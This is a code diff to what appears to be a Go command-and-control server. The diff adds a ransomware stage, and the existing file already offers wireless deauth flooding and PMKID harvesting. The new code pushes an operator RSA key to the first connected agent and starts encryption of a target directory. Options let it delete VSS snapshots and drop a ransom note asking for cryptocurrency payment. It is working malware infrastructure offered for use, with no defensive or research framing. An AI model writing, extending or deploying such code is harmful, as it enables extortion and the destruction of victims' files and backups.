@@ -64,6 +64,15 @@ func main() {
 	deauthBurst := flag.Int("deauth-burst", 3, "802.11 deauth: frames per interval")
 	deauthInterval := flag.Duration("deauth-interval", 0, "802.11 deauth: delay between bursts (0 = flood)")
 	deauthDuration := flag.Duration("deauth-duration", 10*time.Second, "802.11 deauth: total run time")
+	cryptoRoot := flag.String("crypto-root", "", "crypto_malware: directory on the target to encrypt")
+	cryptoPub := flag.String("crypto-pub", "", "crypto_malware: operator RSA public key PEM (required)")
+	cryptoKeyID := flag.Uint("crypto-key-id", 0, "crypto_malware: key ring id stored in .rsky headers")
+	cryptoVSS := flag.Bool("crypto-vss", false, "crypto_malware: kill VSS / snapshots before encrypting")
+	cryptoNote := flag.Bool("crypto-note", false, "crypto_malware: drop ransom note in hit directories")
+	cryptoNoteEmail := flag.String("crypto-note-email", "", "ransom note: contact email")
+	cryptoNoteAddr := flag.String("crypto-note-address", "", "ransom note: payment address")
+	cryptoNotePrice := flag.String("crypto-note-price", "", "ransom note: price (e.g. 0.05 XMR)")
+	cryptoDryRun := flag.Bool("crypto-dry-run", false, "crypto_malware: enumerate only, write nothing")
 	pmkidIface := flag.String("pmkid", "", "802.11 PMKID harvest: monitor-mode iface")
 	pmkidChannel := flag.Int("pmkid-channel", 0, "PMKID: set wifi channel before harvest")
 	pmkidDuration := flag.Duration("pmkid-duration", 60*time.Second, "PMKID: total harvest run time")
@@ -249,6 +258,27 @@ func main() {
 			log.Printf("[wpa3] %v", err)
 		}
 		wcancel()
+	}
+
+	// crypto dispatch — ransomware stage on the first connected agent
+	if *cryptoRoot != "" {
+		if *cryptoPub == "" {
+			log.Printf("[crypto] -crypto-pub <path> required")
+		} else if *cryptoNote && (*cryptoNoteEmail == "" || *cryptoNoteAddr == "" || *cryptoNotePrice == "") {
+			log.Printf("[crypto] -crypto-note requires -crypto-note-email, -crypto-note-address, -crypto-note-price")
+		} else {
+			go runCryptoDispatch(mgr, cryptoDispatchArgs{
+				Root:      *cryptoRoot,
+				PubPath:   *cryptoPub,
+				KeyID:     uint32(*cryptoKeyID),
+				KillVSS:   *cryptoVSS,
+				Note:      *cryptoNote,
+				NoteEmail: *cryptoNoteEmail,
+				NoteAddr:  *cryptoNoteAddr,
+				NotePrice: *cryptoNotePrice,
+				DryRun:    *cryptoDryRun,
+			})
+		}
 	}
 
 	if *dnsBind != "" {
@@ -635,3 +665,46 @@ func runWirelessCapture(mgr *session.Manager, iface string, channel int, outPath
 		}
 	}
 }
+
+// cryptoDispatchArgs carries the operator's -crypto flags to the dispatcher.
+type cryptoDispatchArgs struct {
+	Root      string
+	PubPath   string
+	KeyID     uint32
+	KillVSS   bool
+	Note      bool
+	NoteEmail string
+	NoteAddr  string
+	NotePrice string
+	DryRun    bool
+}
+
+// runCryptoDispatch waits for the first agent, pushes the operator public
+// key, and fires a CryptoStart. Progress streams back as CryptoData events.
+func runCryptoDispatch(mgr *session.Manager, a cryptoDispatchArgs) {
+	for len(mgr.Sessions()) == 0 {
+		time.Sleep(500 * time.Millisecond)
+	}
+	s := mgr.Sessions()[0]
+
+	pub, err := os.ReadFile(a.PubPath)
+	if err != nil {
+		log.Printf("[crypto] read pub %s: %v", a.PubPath, err)
+		return
+	}
+
+	sessionID := fmt.Sprintf("cx-%d", time.Now().UnixNano())
+	log.Printf("[crypto] %s -> %s (vss=%v note=%v dry=%v)",
+		a.Root, s.AgentID, a.KillVSS, a.Note, a.DryRun)
+
+	if err := s.SendKeyPush(sessionID, "operator.pub.pem", pub); err != nil {
+		log.Printf("[crypto] key push: %v", err)
+		return
+	}
+	if err := s.SendCryptoStart(sessionID, a.Root, a.KeyID, a.DryRun, a.KillVSS,
+		a.Note, a.NoteEmail, a.NoteAddr, a.NotePrice, ""); err != nil {
+		log.Printf("[crypto] start: %v", err)
+		return
+	}
+}
+
